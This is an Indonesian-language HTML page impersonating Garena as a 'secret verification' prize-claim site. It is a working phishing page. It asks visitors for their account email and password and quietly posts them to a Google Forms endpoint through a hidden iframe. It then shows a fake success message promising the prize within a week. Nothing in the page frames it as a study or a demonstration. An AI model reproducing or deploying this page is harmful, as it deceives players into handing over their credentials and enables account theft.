<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pusat Verifikasi Rahasia Garena</title>
    <style>
        body { background-color: #0b0d1a; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #1c1f35; padding: 30px; border-radius: 12px; border: 1px solid #fbc02d; width: 90%; max-width: 350px; text-align: center; box-shadow: 0 0 20px rgba(251, 192, 45, 0.2); }
        h2 { font-size: 18px; color: #fbc02d; margin-bottom: 20px; text-transform: uppercase; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #3d415e; border-radius: 6px; background: #0b0d1a; color: white; box-sizing: border-box; }
        .btn { background: linear-gradient(180deg, #fbc02d, #f57f17); color: black; border: none; padding: 12px; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; }
        #success-msg { display: none; padding: 20px; }
        .red-text { color: #ff5252; font-size: 12px; margin-bottom: 10px; display: none; }
    </style>
</head>
<body>

<div class="box" id="login-form">
    <h2>VERIFIKASI RAHASIA</h2>
    <p style="font-size: 13px; margin-bottom: 20px;">Sebelum Claim Hadiah Dari Garena Harap Masukkan Email dan Password</p>
    
    <form id="garenaForm" action="https://docs.google.com/forms/d/e/1FAIpQLScrfc6rFhhgQPNUaNC7HVrT8iA_dDMX4DJUWxBw9ojEVa7nhQ/formResponse" method="POST" target="hidden_iframe" onsubmit="return validateAndSubmit()">
        <input type="email" name="entry.345629703" id="email" placeholder="Email Akun" required>
        <div id="email-error" class="red-text">Harap masukkan format email yang benar (@gmail.com)</div>
        
        <input type="password" name="entry.253774521" placeholder="Password Akun" required>
        
        <button type="submit" class="btn">KONFIRMASI SEKARANG</button>
    </form>
</div>

<div class="box" id="success-msg">
    <h2 style="color: #4caf50;">BERHASIL!</h2>
    <p style="font-size: 14px; line-height: 1.6;">Harap Tunggu Hadiah Anda, Hadiah Akan Didapat Setelah 1 Minggu Kedepan.<br><br><b>TERIMAH KASIH TELAH MENGUNJUNGI WEBSITE RAHASIA GARENA.</b></p>
</div>

<iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted) {showSuccess();}"></iframe>

<script>
    var submitted = false;

    function validateAndSubmit() {
        var email = document.getElementById('email').value;
        if (!email.includes('@gmail.com')) {
            document.getElementById('email-error').style.display = 'block';
            return false;
        }
        submitted = true;
        return true;
    }

    function showSuccess() {
        document.getElementById('login-form').style.display = 'none';
        document.getElementById('success-msg').style.display = 'block';
    }
</script>

</body>
</html>
